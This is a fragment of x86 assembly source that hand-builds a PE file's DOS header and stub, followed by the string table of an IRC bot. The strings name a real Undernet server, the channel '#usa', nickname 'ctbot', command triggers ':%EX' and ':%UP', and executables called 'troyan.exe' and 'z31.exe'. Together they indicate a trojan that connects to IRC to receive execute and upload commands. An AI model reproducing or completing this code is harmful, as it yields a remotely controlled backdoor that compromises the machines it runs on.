DOS_Header:
   .e_magic     dw "MZ"      ;IMAGE_DOS_SIGNATURE 
   .e_cblp      dw 0x0080 
   .e_cp        dw 0x0001 
   .e_crlc      dw 0x0000 
   .e_cparhdr   dw 0x0004 
   .e_minalloc  dw 0x0010 
   .e_maxalloc  dw 0xFFFF 
   .e_ss        dw 0x0000 
   .e_sp        dw 0x0140 
   .e_csum      dw 0x0000 
   .e_ip        dw 0x0000 
   .e_cs        dw 0x0000 
   .e_lfarlc    dw 0x0040 
   .e_ovno      dw 0x0000 
   .e_res       rw 4 
   .e_oemid     dw 0x0000 
   .e_oeminfo   dw 0x0000 
   .e_res2      rw 10 
   .e_lfanew    dd PE_header  ;PE header Offset 

DOS_Stub:
;if the program is run under pure msdos OS, it would crash
;who care?

org $+DOS_Stub 

SZNICK     db "NICK ctbot",0dh,0ah
           db "USER x x x x",0dh,0ah,0
NICK       db "ctbot",0
HOST       db "amsterdam2.nl.eu.undernet.org",0
CMD_PONG   db "PONG ",0
CMD_JOIN   db "JOIN ",0
CMD_MSG    db "PRIVMSG ",0
CHANNEL    db "#usa",0,0,0,0,0,0
TEXTZ      db " wtf?",0dh,0ah,0
PING       db "PING",0
PRIVMSG    db "privmsg",0
KICK       db "kick",0
CRLF       db 0dh,0ah,0
RULE       db ":%EX",0
BLANK      db 0
UPLOAD     db ":%UP",0
EXE        db "troyan.exe",0
EXE_UP     db "z31.exe",0
rb 160-(DOS_Stub-$)
PE_header:  ;PE header is following